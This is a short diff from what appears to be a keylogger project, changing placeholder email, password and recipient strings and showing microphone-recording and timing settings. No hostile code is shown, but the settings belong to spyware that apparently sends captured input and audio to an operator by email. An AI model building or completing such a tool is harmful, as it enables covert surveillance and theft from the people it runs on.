@@ -42,10 +42,10 @@ file_path = "..\\Keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
-email = "Your_Email"
-password = "Your_Password"
+email = "Your Email"
+password = "Your Password"
 
-toaddress = "To_Email"
+toaddress = "To Email"
 
 microphone_time = 10
 time_iteration = 15
